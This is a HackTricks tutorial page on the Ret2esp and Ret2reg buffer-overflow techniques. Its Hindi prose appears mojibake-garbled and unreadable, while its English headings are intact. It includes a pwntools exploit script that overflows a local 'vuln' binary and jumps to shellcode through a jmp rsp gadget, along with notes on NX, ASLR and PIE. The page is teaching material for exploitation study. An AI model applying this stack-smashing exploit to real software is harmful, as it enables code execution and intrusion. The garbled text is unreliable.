# Ret2esp / Ret2reg

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Ret2esp**

**‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ESP (‡§∏‡•ç‡§ü‡•à‡§ï ‡§™‡•â‡§á‡§Ç‡§ü‡§∞) ‡§π‡§Æ‡•á‡§∂‡§æ ‡§∏‡•ç‡§ü‡•à‡§ï ‡§ï‡•á ‡§∂‡•Ä‡§∞‡•ç‡§∑ ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§∂‡§æ‡§∞‡§æ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à**, ‡§Ø‡§π ‡§§‡§ï‡§®‡•Ä‡§ï EIP (‡§á‡§Ç‡§∏‡•ç‡§ü‡•ç‡§∞‡§ï‡•ç‡§∂‡§® ‡§™‡•â‡§á‡§Ç‡§ü‡§∞) ‡§ï‡•ã **`jmp esp`** ‡§Ø‡§æ **`call esp`** ‡§á‡§Ç‡§∏‡•ç‡§ü‡•ç‡§∞‡§ï‡•ç‡§∂‡§® ‡§ï‡•á ‡§™‡§§‡•á ‡§∏‡•á ‡§¨‡§¶‡§≤‡§®‡•á ‡§Æ‡•á‡§Ç ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•à‡•§ ‡§ê‡§∏‡§æ ‡§ï‡§∞‡§®‡•á ‡§∏‡•á, ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§†‡•Ä‡§ï EIP ‡§ï‡•á ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§π‡•ã‡§®‡•á ‡§ï‡•á ‡§¨‡§æ‡§¶ ‡§∞‡§ñ‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§ ‡§ú‡§¨ `ret` ‡§á‡§Ç‡§∏‡•ç‡§ü‡•ç‡§∞‡§ï‡•ç‡§∂‡§® ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§π‡•ã‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ESP ‡§Ö‡§ó‡§≤‡•á ‡§™‡§§‡•á ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§∂‡§æ‡§∞‡§æ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§ú‡•ã ‡§†‡•Ä‡§ï ‡§â‡§∏‡•Ä ‡§∏‡•ç‡§•‡§æ‡§® ‡§™‡§∞ ‡§π‡•à ‡§ú‡§π‡§æ‡§Ç ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§π‡•à‡•§

‡§Ø‡§¶‡§ø **‡§è‡§°‡•ç‡§∞‡•á‡§∏ ‡§∏‡•ç‡§™‡•á‡§∏ ‡§≤‡•á‡§Ü‡§â‡§ü ‡§∞‡•à‡§Ç‡§°‡§Æ‡§æ‡§á‡§ú‡•á‡§∂‡§® (ASLR)** ‡§µ‡§ø‡§Ç‡§°‡•ã‡§ú‡§º ‡§Ø‡§æ ‡§≤‡§ø‡§®‡§ï‡•ç‡§∏ ‡§Æ‡•á‡§Ç ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à, ‡§§‡•ã ‡§∏‡§æ‡§ù‡§æ ‡§≤‡§æ‡§á‡§¨‡•ç‡§∞‡•á‡§∞‡•Ä ‡§Æ‡•á‡§Ç ‡§™‡§æ‡§è ‡§ó‡§è `jmp esp` ‡§Ø‡§æ `call esp` ‡§á‡§Ç‡§∏‡•ç‡§ü‡•ç‡§∞‡§ï‡•ç‡§∂‡§®‡•ã‡§Ç ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à‡•§ ‡§π‡§æ‡§≤‡§æ‡§Å‡§ï‡§ø, [**ASLR**](../common-binary-protections-and-bypasses/aslr/) ‡§∏‡§ï‡•ç‡§∞‡§ø‡§Ø ‡§π‡•ã‡§®‡•á ‡§™‡§∞, ‡§ï‡§ø‡§∏‡•Ä ‡§ï‡•ã ‡§á‡§® ‡§á‡§Ç‡§∏‡•ç‡§ü‡•ç‡§∞‡§ï‡•ç‡§∂‡§®‡•ã‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§Æ‡§ú‡•ã‡§∞ ‡§™‡•ç‡§∞‡•ã‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§ï‡•á ‡§≠‡•Ä‡§§‡§∞ ‡§¶‡•á‡§ñ‡§®‡§æ ‡§™‡§°‡§º ‡§∏‡§ï‡§§‡§æ ‡§π‡•à (‡§î‡§∞ ‡§Ü‡§™‡§ï‡•ã [**PIE**](../common-binary-protections-and-bypasses/pie/) ‡§ï‡•ã ‡§π‡§∞‡§æ‡§®‡•á ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•ã ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à)‡•§

‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, EIP ‡§≠‡•ç‡§∞‡§∑‡•ç‡§ü‡§æ‡§ö‡§æ‡§∞ ‡§ï‡•á **‡§¨‡§æ‡§¶ ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§∞‡§ñ‡§®‡•á** ‡§Æ‡•á‡§Ç ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§π‡•ã‡§®‡§æ, ‡§® ‡§ï‡§ø ‡§∏‡•ç‡§ü‡•à‡§ï ‡§ï‡•á ‡§Æ‡§ß‡•ç‡§Ø ‡§Æ‡•á‡§Ç, ‡§Ø‡§π ‡§∏‡•Å‡§®‡§ø‡§∂‡•ç‡§ö‡§ø‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§ï‡§ø ‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§ï‡•á ‡§∏‡§Ç‡§ö‡§æ‡§≤‡§® ‡§ï‡•á ‡§¶‡•å‡§∞‡§æ‡§® ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä `push` ‡§Ø‡§æ `pop` ‡§á‡§Ç‡§∏‡•ç‡§ü‡•ç‡§∞‡§ï‡•ç‡§∂‡§®‡•ã‡§Ç ‡§ï‡§æ ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§ï‡•á ‡§∏‡§æ‡§• ‡§π‡§∏‡•ç‡§§‡§ï‡•ç‡§∑‡•á‡§™ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§§‡§æ ‡§π‡•à‡•§ ‡§Ø‡§¶‡§ø ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§ï‡•á ‡§∏‡•ç‡§ü‡•à‡§ï ‡§ï‡•á ‡§Æ‡§ß‡•ç‡§Ø ‡§Æ‡•á‡§Ç ‡§∞‡§ñ‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•ã‡§§‡§æ, ‡§§‡•ã ‡§Ø‡§π ‡§π‡§∏‡•ç‡§§‡§ï‡•ç‡§∑‡•á‡§™ ‡§π‡•ã ‡§∏‡§ï‡§§‡§æ ‡§•‡§æ‡•§

### ‡§∏‡•ç‡§•‡§æ‡§® ‡§ï‡•Ä ‡§ï‡§Æ‡•Ä

‡§Ø‡§¶‡§ø ‡§Ü‡§™ RIP ‡§ï‡•ã ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§¨‡§æ‡§¶ ‡§≤‡§ø‡§ñ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡•ç‡§•‡§æ‡§® ‡§ï‡•Ä ‡§ï‡§Æ‡•Ä ‡§Æ‡§π‡§∏‡•Ç‡§∏ ‡§ï‡§∞ ‡§∞‡§π‡•á ‡§π‡•à‡§Ç (‡§∂‡§æ‡§Ø‡§¶ ‡§ï‡•á‡§µ‡§≤ ‡§ï‡•Å‡§õ ‡§¨‡§æ‡§á‡§ü‡•ç‡§∏), ‡§§‡•ã ‡§è‡§ï ‡§™‡•ç‡§∞‡§æ‡§∞‡§Ç‡§≠‡§ø‡§ï `jmp` ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§≤‡§ø‡§ñ‡•á‡§Ç ‡§ú‡•à‡§∏‡•á:
```armasm
sub rsp, 0x30
jmp rsp
```
‡§î‡§∞ ‡§∏‡•ç‡§ü‡•à‡§ï ‡§Æ‡•á‡§Ç ‡§ú‡§≤‡•ç‡§¶‡•Ä ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§≤‡§ø‡§ñ‡•á‡§Ç‡•§

### ‡§â‡§¶‡§æ‡§π‡§∞‡§£

‡§Ü‡§™ ‡§á‡§∏ ‡§§‡§ï‡§®‡•Ä‡§ï ‡§ï‡§æ ‡§è‡§ï ‡§â‡§¶‡§æ‡§π‡§∞‡§£ [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp) ‡§™‡§∞ ‡§è‡§ï ‡§Ö‡§Ç‡§§‡§ø‡§Æ ‡§è‡§ï‡•ç‡§∏‡§™‡•ç‡§≤‡•â‡§á‡§ü ‡§ï‡•á ‡§∏‡§æ‡§• ‡§™‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

jmp_rsp = next(elf.search(asm('jmp rsp')))

payload = b'A' * 120
payload += p64(jmp_rsp)
payload += asm('''
sub rsp, 10;
jmp rsp;
''')

pause()
p.sendlineafter('RSP!\n', payload)
p.interactive()
```
## Ret2reg

‡§á‡§∏‡•Ä ‡§§‡§∞‡§π, ‡§Ø‡§¶‡§ø ‡§π‡§Æ ‡§ú‡§æ‡§®‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø ‡§è‡§ï ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§â‡§∏ ‡§™‡§§‡•á ‡§ï‡•ã ‡§≤‡•å‡§ü‡§æ‡§§‡§æ ‡§π‡•à ‡§ú‡§π‡§æ‡§Å ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§π‡•à, ‡§§‡•ã ‡§π‡§Æ **`call eax`** ‡§Ø‡§æ **`jmp eax`** ‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂‡•ã‡§Ç ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç (‡§ú‡§ø‡§∏‡•á **ret2eax** ‡§§‡§ï‡§®‡•Ä‡§ï ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§ú‡§æ‡§®‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à), ‡§ú‡•ã ‡§π‡§Æ‡§æ‡§∞‡•á ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§ï‡•ã ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡§æ ‡§è‡§ï ‡§î‡§∞ ‡§§‡§∞‡•Ä‡§ï‡§æ ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§ ‡§ú‡•à‡§∏‡•á eax, **‡§ï‡•ã‡§à ‡§Ö‡§®‡•ç‡§Ø ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞** ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§¶‡§ø‡§≤‡§ö‡§∏‡•ç‡§™ ‡§™‡§§‡§æ ‡§π‡•ã, ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à (**ret2reg**).

### Example

You can find an example here: [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/ret2reg/using-ret2reg](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/ret2reg/using-ret2reg)

## Protections

* [**NX**](../common-binary-protections-and-bypasses/no-exec-nx.md): ‡§Ø‡§¶‡§ø ‡§∏‡•ç‡§ü‡•à‡§ï ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§® ‡§Ø‡•ã‡§ó‡•ç‡§Ø ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à ‡§§‡•ã ‡§Ø‡§π ‡§Æ‡§¶‡§¶ ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞‡•á‡§ó‡§æ ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§π‡§Æ‡•á‡§Ç ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§ï‡•ã ‡§∏‡•ç‡§ü‡•à‡§ï ‡§Æ‡•á‡§Ç ‡§∞‡§ñ‡§®‡§æ ‡§π‡•à ‡§î‡§∞ ‡§á‡§∏‡•á ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡•Ç‡§¶‡§®‡§æ ‡§π‡•à‡•§
* [**ASLR**](../common-binary-protections-and-bypasses/aslr/) & [**PIE**](../common-binary-protections-and-bypasses/pie/): ‡§Ø‡•á esp ‡§Ø‡§æ ‡§ï‡§ø‡§∏‡•Ä ‡§Ö‡§®‡•ç‡§Ø ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞ ‡§™‡§∞ ‡§ï‡•Ç‡§¶‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂ ‡§ñ‡•ã‡§ú‡§®‡•á ‡§ï‡•ã ‡§ï‡§†‡§ø‡§® ‡§¨‡§®‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

## References

* [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode)
* [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
